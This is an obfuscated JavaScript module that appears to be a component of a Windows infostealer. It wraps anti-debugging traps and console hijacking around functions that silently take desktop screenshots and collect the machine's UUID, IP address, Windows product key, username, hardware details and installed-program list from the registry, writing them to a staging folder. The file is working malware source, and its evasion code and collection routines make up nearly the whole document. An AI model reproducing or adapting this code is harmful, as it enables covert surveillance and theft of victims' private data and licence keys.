const _0x1fbed8 = (function () {
    let _0x2ac1c7 = true
    return function (_0x2ff798, _0x4231c4) {
      const _0x5e2a9c = _0x2ac1c7
        ? function () {
            if (_0x4231c4) {
              const _0x167f9c = _0x4231c4.apply(_0x2ff798, arguments)
              return (_0x4231c4 = null), _0x167f9c
            }
          }
        : function () {}
      return (_0x2ac1c7 = false), _0x5e2a9c
    }
  })(),
  _0x2e8552 = _0x1fbed8(this, function () {
    return _0x2e8552
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x2e8552)
      .search('(((.+)+)+)+$')
  })
_0x2e8552()
const _0x328263 = (function () {
  let _0x63c3e5 = true
  return function (_0x417c3b, _0x1c7cd2) {
    const _0x517559 = _0x63c3e5
      ? function () {
          if (_0x1c7cd2) {
            const _0x7f48f0 = _0x1c7cd2.apply(_0x417c3b, arguments)
            return (_0x1c7cd2 = null), _0x7f48f0
          }
        }
      : function () {}
    return (_0x63c3e5 = false), _0x517559
  }
})()
;(function () {
  _0x328263(this, function () {
    const _0x30c706 = new RegExp('function *\\( *\\)')
    const _0x5092f5 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x494b13 = _0x38d788('init')
    !_0x30c706.test(_0x494b13 + 'chain') || !_0x5092f5.test(_0x494b13 + 'input')
      ? _0x494b13('0')
      : _0x38d788()
  })()
})()
const _0x5a6b78 = (function () {
    let _0x3efad8 = true
    return function (_0xf97cbf, _0x238bc5) {
      const _0x35243b = _0x3efad8
        ? function () {
            if (_0x238bc5) {
              const _0x35d27e = _0x238bc5.apply(_0xf97cbf, arguments)
              return (_0x238bc5 = null), _0x35d27e
            }
          }
        : function () {}
      return (_0x3efad8 = false), _0x35243b
    }
  })(),
  _0x3a0758 = _0x5a6b78(this, function () {
    let _0xe7aaf9
    try {
      const _0x2651ae = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0xe7aaf9 = _0x2651ae()
    } catch (_0x414fff) {
      _0xe7aaf9 = window
    }
    const _0x328348 = (_0xe7aaf9.console = _0xe7aaf9.console || {})
    const _0x24cb75 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0x206840 = 0; _0x206840 < _0x24cb75.length; _0x206840++) {
      const _0x5f5a21 = _0x5a6b78.constructor.prototype.bind(_0x5a6b78),
        _0x12c796 = _0x24cb75[_0x206840],
        _0xbf98fe = _0x328348[_0x12c796] || _0x5f5a21
      _0x5f5a21['__proto__'] = _0x5a6b78.bind(_0x5a6b78)
      _0x5f5a21.toString = _0xbf98fe.toString.bind(_0xbf98fe)
      _0x328348[_0x12c796] = _0x5f5a21
    }
  })
_0x3a0758()
var _0x59669f = require('winreg')
const _0x461c64 = require('util'),
  _0x313ac7 = _0x461c64.promisify(require('child_process').exec),
  _0x525d51 = require('./save'),
  _0x53099e = require('./core')
const _0xce19cb = require('fs'),
  _0xa10cfb = require('screenshot-desktop')
async function _0x953334(_0x24eb2a) {
  if (_0x24eb2a != 'yes') {
    return
  }
  try {
    const _0x1a53c6 = (await _0x525d51.getbasepath()) + '\\System\\'
    try {
      _0xce19cb.mkdirSync(_0x1a53c6)
    } catch (_0x1a28ea) {}
    _0xa10cfb({ format: 'png' })
      .then((_0x2e0e3b) => {
        _0xce19cb.writeFileSync(
          _0x525d51.basepath + '\\System\\Screenshot.png',
          _0x2e0e3b
        )
      })
      .catch((_0x57c9b1) => {})
  } catch (_0x5cb8ee) {}
}
async function _0x34d785(
  _0x2d3b90,
  _0x4aea39,
  _0x157104,
  _0x32c076,
  _0x414f22,
  _0x92b409,
  _0x43de30,
  _0x16b8b7,
  _0x406e49,
  _0xc7bd0c,
  _0x2a1bc9,
  _0x5c0669
) {
  if (_0x2d3b90 != 'yes') {
    return
  }
  let _0x1c11f7 = await _0x7b52ff(
    _0x2d3b90,
    _0x4aea39,
    _0x157104,
    _0x32c076,
    _0x414f22,
    _0x92b409,
    _0x43de30,
    _0x16b8b7,
    _0x406e49,
    _0xc7bd0c,
    _0x2a1bc9,
    _0x5c0669
  )
  const _0x2b7a22 = (await _0x525d51.getbasepath()) + '\\System\\'
  try {
    _0xce19cb.mkdirSync(_0x2b7a22)
  } catch (_0x110857) {}
  _0xce19cb.writeFileSync(_0x2b7a22 + 'System Info.txt', _0x1c11f7)
}
async function _0x7b52ff(
  _0x4296cd,
  _0x331138,
  _0x3604c7,
  _0x56f9cc,
  _0x5aab6d,
  _0x2b3d60,
  _0x5771dd,
  _0x5b4fa7,
  _0x3179a7,
  _0x1a0c0a,
  _0x259a53,
  _0x4a0215
) {
  if (_0x4296cd != 'yes') {
    return
  }
  let _0x556d6f = _0x53099e.getHeader()
  try {
    _0x556d6f += 'UUID: ' + _0x2b3d60 + '\n'
    _0x556d6f += 'IP: ' + _0x331138 + '\n'
    _0x556d6f += 'Windows Key: ' + _0x259a53 + '\n'
    _0x556d6f += 'Windows Version: ' + _0x4a0215 + '\n'
    _0x556d6f += 'HOSTNAME: ' + _0x3604c7 + '\n'
    _0x556d6f += 'USERNAME: ' + process.env.userprofile.split('\\')[2] + '\n'
    _0x556d6f += 'OS: ' + _0x5b4fa7 + '\n'
    _0x556d6f += 'FileLocation: ' + process.cwd() + '\n'
    _0x556d6f += 'CPU: ' + _0x3179a7 + '\n'
    _0x556d6f += 'CPU Core: ' + _0x5771dd + '\n'
    _0x556d6f += 'GPU(s): ' + _0x1a0c0a.split('   ').join(', ') + '\n'
    _0x556d6f += 'RAM: ' + _0x5aab6d + ' GB\n'
    _0x556d6f += 'DISK: ' + _0x56f9cc + ' GB\n\n\n'
    _0x556d6f +=
      '\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nApplications installed\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n' +
      (await _0x2b758c()) +
      '\n'
  } catch (_0x1eef0d) {}
  return _0x556d6f
}
async function _0x3db314() {
  let _0x48dcb6 = (await _0x5ec690('wmic logicaldisk get size')).split(' ')
  for (let _0x4bedea of _0x48dcb6) {
    if (_0x4bedea.trim() !== '' && _0x4bedea.trim().toLowerCase() !== 'size') {
      return Math.floor(parseInt(_0x4bedea) / 1073741824).toString()
    }
  }
  return '1000'
}
async function _0x5ec690(_0x56e7a2) {
  const { stdout: _0x4ff7e7, _: _0x4abfcd } = await _0x313ac7(_0x56e7a2)
  return _0x4ff7e7.trim()
}
async function _0x2b758c() {
  const _0x14cb63 = new _0x59669f({
      hive: _0x59669f.HKLM,
      key: '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
    }),
    _0x4d6d3f = await new Promise((_0x43c6c5, _0x1b847b) => {
      _0x14cb63.keyExists((_0x47cc91, _0x3c3f70) => {
        _0x47cc91 != null && _0x43c6c5(false)
        _0x43c6c5(_0x3c3f70)
      })
    })
  if (!_0x4d6d3f) {
    return ''
  }
  const _0x38bfdf = await new Promise((_0x405382, _0x81004d) => {
    _0x14cb63.keys((_0x19edf3, _0x6b76e4) => {
      _0x19edf3 != null && _0x405382([])
      _0x405382(_0x6b76e4)
    })
  })
  if (_0x38bfdf.length == 0) {
    return ''
  }
  let _0x31da8e = ''
  for (let _0x4a24c6 = 0; _0x4a24c6 < _0x38bfdf.length; _0x4a24c6++) {
    const _0x186d6f = _0x38bfdf[_0x4a24c6],
      _0x5bf27f = await new Promise((_0x3a3902, _0x30c616) => {
        _0x186d6f.values((_0x5237d6, _0x559dfa) => {
          _0x5237d6 != null && _0x3a3902([])
          _0x3a3902(_0x559dfa)
        })
      })
    for (let _0x27b0e1 = 0; _0x27b0e1 < _0x5bf27f.length; _0x27b0e1++) {
      _0x5bf27f[_0x27b0e1].name == 'DisplayName' &&
        (_0x31da8e = _0x31da8e + _0x5bf27f[_0x27b0e1].value + '\n')
    }
  }
  return _0x31da8e
}
module.exports = {
  takeScreenshotAndSave: _0x953334,
  getSysteminformations: _0x34d785,
}
function _0x38d788(_0xf286d8) {
  function _0x46bc43(_0x5b9593) {
    if (typeof _0x5b9593 === 'string') {
      return function (_0x36af4b) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x5b9593 / _0x5b9593).length !== 1 || _0x5b9593 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x46bc43(++_0x5b9593)
  }
  try {
    if (_0xf286d8) {
      return _0x46bc43
    } else {
      _0x46bc43(0)
    }
  } catch (_0x24807f) {}
}
